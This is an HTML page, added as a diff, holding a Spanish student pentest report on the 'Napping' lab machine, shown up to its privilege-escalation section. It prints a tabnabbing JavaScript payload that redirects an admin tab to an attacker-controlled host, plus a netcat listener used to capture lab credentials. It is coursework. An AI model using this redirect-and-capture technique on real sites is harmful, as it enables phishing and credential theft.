@@ -1,0 +1,1318 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actividad 11 :: Red Team Report - Napping 101</title>
+    <link rel="stylesheet" href="style.css">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;600&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+
+<body>
+    <!-- Fondo Animado -->
+    <div class="animated-bg"></div>
+    <div class="particles"></div>
+
+    <div class="app-container">
+        <!-- Navegación -->
+        <nav class="neon-nav">
+            <div class="nav-logo">JAVIER<span class="bad">XD1383</span></div>
+            <div class="nav-items">
+                <a href="index.html" class="nav-btn color-1"> INICIO</a>
+                <a href="actividades.html" class="nav-btn color-4"> ACTIVIDADES</a>
+                <a href="proyectos.html" class="nav-btn color-3"> PROYECTOS</a>
+                <div class="nav-dropdown">
+                    <span class="nav-btn color-hof nav-dropdown-btn">
+                        <i class="fas fa-trophy"></i> HALL OF FAME
+                        <i class="fas fa-chevron-down dropdown-arrow"></i>
+                    </span>
+                    <div class="nav-dropdown-menu">
+                        <div class="dropdown-header">ROAD TO HALL OF FAME</div>
+                        <div class="dropdown-divider"></div>
+                        <a href="actividad8halloffame.html" class="dropdown-item">
+                            <i class="fas fa-database"></i> SQL Injection
+                            <span class="item-tag">ACTIVO</span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </nav>
+
+        <main>
+            <section class="slide-in">
+                <div class="article-container">
+                    <header class="article-header">
+                        <div class="article-meta">ACTIVIDAD 11 | RED TEAM REPORT</div>
+                        <h1
+                            style="font-family:'Orbitron'; font-size: 2.0rem; margin-bottom: 10px; color: var(--c-yellow);">
+                            PENTESTING DE NAPPING 101</h1>
+
+                        <div class="team-box"
+                            style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 10px; margin-top: 20px; border-left: 3px solid var(--c-yellow);">
+                            <h4 style="color: var(--c-yellow); margin-bottom: 10px;">INTEGRANTES:</h4>
+                            <ul
+                                style="list-style: none; padding: 0; font-size: 0.9rem; color: #ddd; display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px;">
+                                <li><i class="fas fa-user-check" style="color: var(--c-yellow);"></i> Alonso Castillo
+                                    Omar Karim - <strong>179033</strong></li>
+                                <li><i class="fas fa-user-check" style="color: var(--c-yellow);"></i> Cruz Juárez
+                                    Francisco Javier - <strong>177622</strong></li>
+                                <li><i class="fas fa-user-check" style="color: var(--c-yellow);"></i> Espinoza Aguilar
+                                    Brian Salvador - <strong>175031</strong></li>
+                                <li><i class="fas fa-user-check" style="color: var(--c-yellow);"></i> Martínez Lara
+                                    Santiago de la Cruz - <strong>177685</strong></li>
+                                <li><i class="fas fa-user-check" style="color: var(--c-yellow);"></i> Sánchez Ramírez
+                                    Mayeli - <strong>173030</strong></li>
+                                <li><i class="fas fa-user-check" style="color: var(--c-yellow);"></i> Sánchez Zavala
+                                    Alan Gilberto - <strong>177263</strong></li>
+                            </ul>
+                            <div
+                                style="font-size: 0.9rem; color: #ddd; display: flex; flex-direction: column; gap: 5px;">
+                                <p><strong>Maestro:</strong> Servando López Contreras</p>
+                                <p><strong>Materia:</strong> CNO V Seguridad Informática</p>
+                                <p><strong>Fecha:</strong> 22 de marzo 2026</p>
+                            </div>
+                        </div>
+
+                        <a href="Pdfs/act11-Equipo4.pdf" target="_blank" class="pdf-btn"
+                            style="text-decoration: none; display: inline-block; padding: 10px 20px; text-align: center; margin-top: 20px;">
+                            <i class="fas fa-file-pdf"></i> VER PDF ORIGINAL
+                        </a>
+                    </header>
+
+                    <article class="article-body">
+                        <h2><i class="fas fa-bullseye"></i> OBJETIVO GENERAL</h2>
+                        <div class="info-box">
+                            <p>Desarrollar un informe técnico profesional de pruebas de penetración (Pentesting Report)
+                                sobre la máquina vulnerable <strong>Napping</strong>, aplicando una metodología
+                                estructurada de evaluación de seguridad, documentando hallazgos, evidencias técnicas,
+                                análisis de riesgo y propuestas de mitigación, demostrando competencias en análisis
+                                ofensivo y redacción técnica profesional.</p>
+                        </div>
+
+                        <h2><i class="fas fa-list-ul"></i> OBJETIVOS ESPECÍFICOS</h2>
+                        <ul class="glowing-list">
+                            <li>Aplicar una metodología formal de pentesting (reconocimiento, enumeración, explotación y
+                                post-explotación).</li>
+                            <li>Identificar, explotar y documentar vulnerabilidades presentes en la máquina objetivo.
+                            </li>
+                            <li>Elaborar un informe técnico profesional con estructura ejecutiva y técnica, incluyendo
+                                evaluación de impacto y recomendaciones de remediación.</li>
+                        </ul>
+
+                        <p style="margin-top: 15px;"><strong>Duración aproximada:</strong> 06 horas y 30 minutos.</p>
+
+                        <div class="tech-divider"></div>
+
+                        <h2><i class="fas fa-server"></i> CONTEXTO DE LA MÁQUINA</h2>
+                        <div class="info-box" style="border-color: var(--c-cyan);">
+                            <p>La máquina <strong>Napping</strong> simula un entorno corporativo vulnerable orientado a
+                                servicios de almacenamiento/servidor de archivos.</p>
+                            <p>El estudiante actuará como <strong>analista Red Team contratado por la
+                                    organización</strong> para evaluar el nivel de exposición del sistema.</p>
+                        </div>
+
+                        <div class="tech-divider"></div>
+
+                        <h2><i class="fas fa-file-alt"></i> ESTRUCTURA DEL INFORME</h2>
+                        <ol class="glowing-list">
+                            <li>Portada.</li>
+                            <li>Executive Summary (resumen ejecutivo).</li>
+                            <li>Alcance (scope).</li>
+                            <li>Metodología aplicada.</li>
+                            <li>Fases de reconocimiento.</li>
+                            <li>Enumeración.</li>
+                            <li>Explotación.</li>
+                            <li>Escalada de privilegios.</li>
+                            <li>Análisis de impacto (modelo CIA).</li>
+                            <li>Recomendaciones técnicas.</li>
+                            <li>Completar tabla de hallazgos (ID, Vulnerabilidad, Severidad, Evidencia, Impacto,
+                                Recomendación).</li>
+                        </ol>
+
+                        <div class="tech-divider"></div>
+
+                        <h2><i class="fas fa-project-diagram"></i> PRESENTACIÓN PROFESIONAL</h2>
+                        <div class="info-box" style="border-color: var(--c-purple);">
+                            <p>Después, el estudiante deberá preparar una <strong>presentación profesional</strong> como
+                                si estuviera frente al Consejo Directivo de una empresa.</p>
+                        </div>
+
+                        <h3 style="margin-top: 20px; color: var(--c-purple);">Características de la presentación:</h3>
+                        <ul class="glowing-list">
+                            <li>Diseño limpio, corporativo.</li>
+                            <li>Máximo 12 diapositivas.</li>
+                            <li>Enfoque estratégico (no técnico profundo).</li>
+                            <li>Lenguaje ejecutivo.</li>
+                            <li>Gráficos de riesgo.</li>
+                            <li>Nivel de impacto en negocio.</li>
+                        </ul>
+
+                        <h3 style="margin-top: 20px; color: var(--c-purple);">Estructura de la presentación:</h3>
+                        <ol class="glowing-list">
+                            <li>Portada corporativa.</li>
+                            <li>Contexto del Engagement.</li>
+                            <li>Metodología aplicada.</li>
+                            <li>Nivel general del riesgo.</li>
+                            <li>Hallazgos críticos.</li>
+                            <li>Escenario del impacto empresarial.</li>
+                            <li>Matriz de riesgo.</li>
+                            <li>Recomendaciones estratégicas.</li>
+                            <li>Roadmap de remediación.</li>
+                            <li>Conclusión ejecutiva.</li>
+                        </ol>
+
+                        <div class="tech-divider"></div>
+
+                        <h2><i class="fas fa-check-square"></i> RÚBRICA DE EVALUACIÓN</h2>
+                        <div style="overflow-x: auto; margin-top: 15px;">
+                            <table
+                                style="width: 100%; border-collapse: collapse; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); color: #ccc; font-size: 0.85rem;">
+                                <thead>
+                                    <tr style="background: rgba(255,255,255,0.1); text-align: left;">
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Criterio
+                                        </th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Ponderación
+                                        </th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Excelente
+                                        </th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Bueno</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Regular</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Insuficiente
+                                        </th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold;">
+                                            01. Metodología aplicada (PTES / OWASP)</td>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">
+                                            20 pts.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">18-20 pts. -
+                                            Aplicación clara, estructurada y coherente de fases.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">14-17 pts. -
+                                            Metodología correcta pero con ligera falta de profundidad.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">10-13 pts. -
+                                            Fases mencionadas sin integración real.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">0-9 pts. -
+                                            Sin estructura.</td>
+                                    </tr>
+                                    <tr>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold;">
+                                            02. Reconocimiento y Enumeración técnica</td>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">
+                                            15 pts.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">14-15 pts. -
+                                            Escaneos correctamente ejecutados, interpretados y explicados.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">11-13 pts. -
+                                            Evidencia técnica adecuada con interpretación aceptable.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">8-10 pts. -
+                                            Solo capturas sin análisis profundo.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">0-7 pts. -
+                                            Escaneo incompleto o mal interpretado.</td>
+                                    </tr>
+                                    <tr>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold;">
+                                            03. Calidad en la presentación del informe</td>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">
+                                            15 pts.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">14-15 pts. -
+                                            Informe ejecutivo de alta calidad, formato profesional.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">11-13 pts. -
+                                            Presentación adecuada con errores menores.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">8-10 pts. -
+                                            Presentación descuidada o poco clara.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">0-7 pts. -
+                                            Desordenado, difícil de leer.</td>
+                                    </tr>
+                                    <tr>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold;">
+                                            04. Explotación documentada</td>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">
+                                            20 pts.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">18-20 pts. -
+                                            Vulnerabilidad explotada con evidencia clara y reproducible.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">14-17 pts. -
+                                            Explotación lograda pero con documentación parcial.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">10-13 pts. -
+                                            Evidencia mínima o confusa.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">0-9 pts. -
+                                            No logra explotación.</td>
+                                    </tr>
+                                    <tr>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold;">
+                                            05. Presentación Ejecutiva Corporativa</td>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">
+                                            15 pts.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">14-15 pts. -
+                                            Comunicación estratégica, visual profesional.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">11-13 pts. -
+                                            Presentación clara pero con diseño mejorable.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">8-10 pts. -
+                                            Slides saturadas o lectura textual.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">0-7 pts. -
+                                            Presentación improvisada.</td>
+                                    </tr>
+                                    <tr>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold;">
+                                            06. Pensamiento Crítico y Nivel Analítico</td>
+                                        <td
+                                            style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">
+                                            15 pts.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">14-15 pts. -
+                                            Comprensión profunda del vector de ataque.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">11-13 pts. -
+                                            Buen análisis con limitaciones menores.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">8-10 pts. -
+                                            Análisis superficial.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">0-7 pts. -
+                                            Trabajo mecánico.</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </article>
+
+                    <div class="tech-divider"></div>
+
+                    <!-- REPORTE TÉCNICO START -->
+                    <article class="article-body">
+                        <div
+                            style="text-align: center; margin-bottom: 30px; border-bottom: 2px solid var(--c-yellow); padding-bottom: 20px;">
+                            <h1 style="font-family:'Orbitron'; font-size: 2.2rem; margin-bottom: 5px; color: #fff;">
+                                REPORTE TÉCNICO DE PENTESTING</h1>
+                            <h2 style="font-family:'Orbitron'; font-size: 1.6rem; color: var(--c-yellow);">Red Team
+                                Report – Napping 101</h2>
+                        </div>
+
+                        <h2><i class="fas fa-file-alt"></i> Contenido</h2>
+                        <ul
+                            style="list-style: none; padding-left: 10px; font-family: monospace; color: #ccc; line-height: 1.8;">
+                            <li>2. Resumen Ejecutivo ................................ 3</li>
+                            <li>3. Alcance (Scope) ................................. 3</li>
+                            <li>4. Metodología aplicada ............................. 3</li>
+                            <li>5. Fases de reconocimiento .......................... 4</li>
+                            <li>6. Enumeración ...................................... 5</li>
+                            <li style="padding-left: 20px;">Exploración de funcionamiento de sistema ............ 9</li>
+                            <li>7. Explotación ...................................... 11</li>
+                            <li>8. Escalada de privilegios .......................... 16</li>
+                            <li>9. Análisis de impacto (modelo CIA) ................. 21</li>
+                            <li>10. Recomendaciones técnicas ........................ 22</li>
+                            <li>11. Tabla de hallazgos .............................. 23</li>
+                            <li>Referencias Bibliográficas .......................... 25</li>
+                        </ul>
+
+                        <div class="tech-divider"></div>
+
+                        <h2 style="color: var(--c-yellow);">2. Resumen Ejecutivo</h2>
+                        <div class="info-box">
+                            <p>El presente documento detalla los resultados de una prueba de penetración (pentesting)
+                                realizada sobre la máquina objetivo. El objetivo principal de esta evaluación es
+                                identificar, documentar y analizar posibles vulnerabilidades de seguridad que puedan
+                                comprometer la confidencialidad, integridad o disponibilidad del sistema. Durante la
+                                evaluación inicial, se logró identificar la dirección IP del objetivo y se descubrieron
+                                servicios activos que presentan configuraciones susceptibles a explotación, destacando
+                                vectores de ataque orientados a servicios web.</p>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">3. Alcance (Scope)</h2>
+                        <div class="info-box" style="border-color: var(--c-cyan);">
+                            <p>El alcance de la presente evaluación de seguridad técnica se delimitó de manera estricta
+                                a la máquina virtual denominada <strong>"Napping"</strong>, operando dentro de un
+                                entorno de red local controlado. Los vectores de análisis autorizados se concentraron de
+                                forma exclusiva en la dirección IP objetivo identificada como
+                                <strong>192.168.56.103</strong>.</p>
+                            <p style="margin-top: 10px;">Se autorizó la ejecución de técnicas de reconocimiento de red,
+                                escaneo de puertos, enumeración profunda de servicios, análisis de vulnerabilidades en
+                                aplicaciones web y explotación de fallos de configuración. El objetivo se centró
+                                únicamente en comprometer la integridad, confidencialidad y disponibilidad de los
+                                servicios alojados en la IP definida.</p>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">4. Metodología aplicada</h2>
+                        <div class="info-box" style="border-color: var(--c-purple);">
+                            <p>Para la ejecución de esta auditoría, se implementó una metodología técnica y estructurada
+                                basada en los estándares de la industria para pruebas de penetración (como PTES u
+                                OWASP). El proceso se dividió en fases secuenciales:</p>
+                            <ul class="glowing-list" style="margin-top: 10px;">
+                                <li><strong>Fase 1 - Reconocimiento:</strong> Se utilizaron técnicas de descubrimiento a
+                                    nivel de capa de red (ARP) para mapear el segmento local, identificar hosts activos
+                                    y aislar la dirección de la máquina objetivo.</li>
+                                <li><strong>Fase 2 - Enumeración:</strong> Se emplearon herramientas de escaneo activo
+                                    para perfilar el sistema operativo, identificar puertos lógicos abiertos y
+                                    determinar las versiones exactas de los servicios en ejecución (SSH y HTTP).</li>
+                                <li><strong>Fase 3 - Explotación:</strong> Análisis de entradas de usuario no
+                                    sanitizadas y funcionalidades críticas para intentar ejecutar código arbitrario,
+                                    falsificar peticiones (SSRF) o evadir mecanismos de autenticación.</li>
+                                <li><strong>Fase 4 - Post-explotación y Escalada de Privilegios:</strong> Enumeración
+                                    interna del sistema operativo para identificar vectores de escalada, tareas
+                                    programadas inseguras o binarios con permisos mal configurados (SUID) que permitan
+                                    elevar los privilegios a root.</li>
+                            </ul>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">5. Fases de reconocimiento</h2>
+                        <div class="sec">
+                            <p>Se inició la fase de reconocimiento de red obteniendo privilegios administrativos
+                                mediante el comando <code>sudo su</code>. Posteriormente, se utilizó la herramienta
+                                <code>netdiscover</code> para identificar los hosts activos dentro del segmento de red.
+                            </p>
+
+                            <!-- IMAGEN: NETDISCOVER -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia1.png" alt="Netdiscover Output" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-cyan); box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);">
+                            </div>
+
+                            <p>Durante el análisis del tráfico ARP, se descartó la dirección IP 192.168.56.1 al intuir
+                                que correspondía al enrutador. Se determinó que la IP del objetivo es
+                                <strong>192.168.56.103</strong>.</p>
+                            <p style="margin-top: 10px;">Como alternativas complementarias, se consideró el uso de:</p>
+                            <ul class="glowing-list">
+                                <li><strong>Legión:</strong> Herramienta semiautomatizada para pruebas de penetración de
+                                    redes.</li>
+                                <li><strong>Spider:</strong> Rastreador web rápido escrito en Go para análisis de
+                                    sitemap, robots.txt y descubrimiento de enlaces.</li>
+                            </ul>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">6. Enumeración</h2>
+                        <div class="sec">
+                            <p>Una vez confirmada la IP objetivo, se procedió a la fase de enumeración profunda
+                                utilizando la herramienta <strong>Nmap</strong> con la bandera <code>-A</code> sobre la
+                                dirección 192.168.56.103.</p>
+
+                            <!-- IMAGEN: NMAP -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia2.png" alt="Nmap Scan Results" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-yellow); box-shadow: 0 0 15px rgba(255, 255, 0, 0.2);">
+                            </div>
+
+                            <p>El escaneo reveló los siguientes puertos abiertos y servicios:</p>
+                            <ul class="glowing-list" style="margin-top: 10px;">
+                                <li><strong>Puerto 22/tcp - Servicio SSH (OpenSSH 8.2p1):</strong> Facilita el acceso
+                                    remoto cifrado. Su reconocimiento es crítico para intentar recopilar credenciales o
+                                    identificar CVEs específicos.</li>
+                                <li><strong>Puerto 80/tcp - Servicio HTTP (Apache httpd 2.4.41):</strong> Vector de
+                                    ataque más accesible. Se determinó que la versión de Apache es antigua, lo cual es
+                                    fundamental para la búsqueda de exploits conocidos.</li>
+                            </ul>
+
+                            <h3 style="color: var(--c-cyan); margin-top: 25px;">Vulnerabilidades Web Identificadas</h3>
+                            <p style="margin-top: 10px;"><strong>Ausencia de bandera de seguridad en cookie de sesión
+                                    (PHPSESSID):</strong> Se observó que la cookie de sesión generada en el portal de
+                                autenticación (login) carece del atributo de seguridad "httponly". Este indicador revela
+                                que el token de sesión no está protegido contra el acceso desde el lado del cliente. En
+                                un escenario de ataque, reconocer esta mala configuración es vital porque viabiliza el
+                                secuestro de sesiones (Session Hijacking) si se logra inyectar código malicioso a través
+                                de una vulnerabilidad de Cross-Site Scripting (XSS).</p>
+
+                            <p style="margin-top: 10px;"><strong>Huella del sistema operativo (Linux 4.15 – 5.19) y
+                                    Dirección MAC:</strong> Se logró extraer la dirección MAC y perfilar el sistema
+                                subyacente, estimando un rango de versión del kernel de Linux. La técnica de perfilado
+                                del sistema operativo (OS fingerprinting) es indispensable para la planificación del
+                                ataque, ya que permite al auditor descartar cargas útiles (payloads) incompatibles y
+                                enfocar la investigación en vulnerabilidades de escalada de privilegios locales (LPE)
+                                que afecten exclusivamente a la arquitectura y versión del kernel descubiertas.</p>
+
+                            <!-- IMAGEN: PORTAL LOGIN -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia3.png" alt="Login Portal" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-cyan); box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);">
+                                <p style="font-size: 0.8rem; color: #666; margin-top: 5px;">Portal de autenticación identificado en la IP objetivo</p>
+                            </div>
+
+                            <h3 style="color: var(--c-cyan); margin-top: 25px;">Avistamiento de directorios</h3>
+                            <p>Para el avistamiento de directorios, se ejecutó inicialmente la herramienta
+                                <strong>Nikto</strong>, la cual logró encontrar únicamente el archivo
+                                <code>config.php</code>.</p>
+
+                            <!-- IMAGEN: NIKTO OUTPUT -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia4.png" alt="Nikto Scan Results" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-purple); box-shadow: 0 0 15px rgba(160, 32, 240, 0.2);">
+                            </div>
+
+                            <p>Para ampliar el descubrimiento, se utilizó <strong>DirBuster</strong> configurado para
+                                buscar archivos con extensiones <code>html</code>, <code>txt</code> y <code>php</code>.
+                            </p>
+
+                            <!-- IMAGEN: DIRBUSTER -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia5.png" alt="DirBuster Results" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-yellow); box-shadow: 0 0 15px rgba(255, 255, 0, 0.2);">
+                            </div>
+
+                            <p>Este proceso resultó en la identificación de rutas adicionales críticas, incluyendo
+                                <code>register.php</code>, <code>index.php</code> y <code>welcome.php</code>. El
+                                descubrimiento de estos recursos es un paso obligado para mapear la superficie de ataque
+                                real; los archivos de configuración (<code>config.php</code>) son objetivos de alto
+                                valor porque frecuentemente exponen credenciales de bases de datos embebidas en el
+                                código, mientras que los formularios ocultos (<code>register.php</code>) revelan nuevas
+                                funcionalidades con las que se puede interactuar para probar técnicas de inyección,
+                                evasión de autenticación o manipulación de parámetros.</p>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">Exploración de funcionamiento de sistema
+                        </h2>
+                        <div class="sec">
+                            <p>Finalmente, se interactuó con la aplicación web registrando un usuario de prueba en
+                                <code>register.php</code> utilizando la contraseña <strong>"123456"</strong>.</p>
+
+                            <!-- IMAGEN: REGISTER FORM -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia6.png" alt="Register Form" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-cyan); box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);">
+                            </div>
+
+                            <p>Tras autenticarse exitosamente en <code>index.php</code>, la aplicación redirigió al
+                                archivo <code>welcome.php</code>, el cual presenta una interfaz de "promoción de blogs
+                                gratuitos" que solicita al usuario ingresar un enlace web para ser revisado por un
+                                administrador.</p>
+
+                            <!-- IMAGEN: WELCOME INTERFACE -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia7.png" alt="Welcome Page" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-green); box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);">
+                            </div>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">7. Explotación</h2>
+                        <div class="sec">
+                            <p>Durante esta fase, se procedió a explotar el formulario de envío de enlaces ubicado en
+                                <code>welcome.php</code>. Se identificó que la aplicación era susceptible a un ataque de
+                                <strong>Tabnabbing</strong> (o <strong>Tab Hijacking</strong>), una técnica que
+                                aprovecha el comportamiento de las pestañas del navegador y el objeto
+                                <code>window.opener</code> para redirigir una pestaña en segundo plano hacia un sitio
+                                malicioso.</p>
+                            <p style="margin-top: 10px;">Se verificó la dirección IP local de la máquina atacante
+                                (<strong>192.168.56.101</strong>) mediante el comando <code>ifconfig</code> y se creó un
+                                directorio de trabajo denominado <strong>Napping</strong>.</p>
+
+                            <!-- IMAGEN: IFCONFIG Y DIRECTORIO -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia8.png" alt="Ifconfig and Directory Creation" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-cyan); box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);">
+                            </div>
+
+                            <h3 style="color: var(--c-cyan); margin-top: 25px;">Creación del Payload</h3>
+                            <p>Se elaboró un archivo malicioso en formato HTML (<code>payload.html</code>) diseñado para
+                                ejecutar código JavaScript. El script utiliza la instrucción
+                                <code>window.opener.parent.location.replace('http://192.168.56.101:8000/home.html');</code>
+                                para forzar a la pestaña padre (la sesión del administrador) a redirigirse hacia un
+                                servidor controlado por el atacante.</p>
+
+                            <!-- IMAGEN: NANO PAYLOAD -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia9.png" alt="Payload Creation" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-yellow); box-shadow: 0 0 15px rgba(255, 255, 0, 0.2);">
+                            </div>
+
+                            <h3 style="color: var(--c-cyan); margin-top: 25px;">Alojamiento del Payload</h3>
+                            <p>Se levantó un servidor web local utilizando el módulo de Python <code>http.server</code>
+                                en el puerto 80 para servir el archivo <code>payload.html</code>.</p>
+
+                            <!-- IMAGEN: PYTHON SERVER -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia10.png" alt="Python HTTP Server" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-green); box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);">
+                            </div>
+
+                            <h3 style="color: var(--c-cyan); margin-top: 25px;">Ejecución del ataque</h3>
+                            <p>Se envió la URL del payload (<code>http://192.168.56.101/payload.html</code>) a través
+                                del formulario de la aplicación web víctima, el cual está diseñado para que un
+                                administrador revise los enlaces. Paralelamente, se configuró un
+                                <strong>listener</strong> con Netcat en el puerto 8000 (<code>nc -lvnp 8000</code>) para
+                                interceptar la respuesta.</p>
+
+                            <!-- IMAGEN: ENVÍO LINK Y NC LISTENER -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia11.png" alt="Payload Delivery and Netcat Listener" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-purple); box-shadow: 0 0 15px rgba(160, 32, 240, 0.2);">
+                            </div>
+
+                            <h3 style="color: var(--c-cyan); margin-top: 25px;">Obtención de credenciales</h3>
+                            <p>Tras la interacción del administrador simulado con el enlace, el script redirigió su
+                                sesión, capturando una petición POST en el puerto 8000. Dicha petición contenía las
+                                credenciales en texto plano correspondientes al usuario <strong>daniel</strong> con la
+                                contraseña <strong>C@ughtm3napping123</strong>.</p>
+
+                            <!-- IMAGEN: CREDENCIALES CAPTURADAS -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia12.png" alt="Credentials Captured" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-yellow); box-shadow: 0 0 15px rgba(255, 255, 0, 0.2);">
+                            </div>
+
+                            <h3 style="color: var(--c-cyan); margin-top: 25px;">Acceso inicial</h3>
+                            <p>Utilizando las credenciales obtenidas, se estableció una conexión SSH exitosa hacia la
+                                máquina objetivo (<strong>192.168.56.103</strong>), logrando el compromiso inicial del
+                                sistema con los privilegios del usuario daniel.</p>
+
+                            <!-- IMAGEN: SSH LOGIN DANIEL -->
+                            <div style="margin: 20px 0; text-align: center;">
+                                <img src="img/actividad11/evidencia13.png" alt="SSH Access as Daniel" 
+                                    style="max-width: 100%; border-radius: 8px; border: 2px solid var(--c-cyan); box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);">
+                            </div>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">8. Escalada de privilegios</h2>
+                        <div class="sec">
+                            <p>La fase de post-explotación y escalada se dividió en dos etapas: un movimiento lateral
+                                hacia un usuario con mayores privilegios y la posterior escalada vertical a
+                                administrador del sistema (root).</p>
+
+                            <h3 style="color: var(--c-cyan); margin-top: 25px;">Movimiento Lateral (Usuario adrian)</h3>
+                            <p><strong>Enumeración local:</strong> Al explorar los directorios de los usuarios del
+                                sistema, se identificaron los archivos <code>query.py</code> y
+                                <code>site_status.txt</code> dentro del directorio <code>/home/adrian</code>.</p>
+
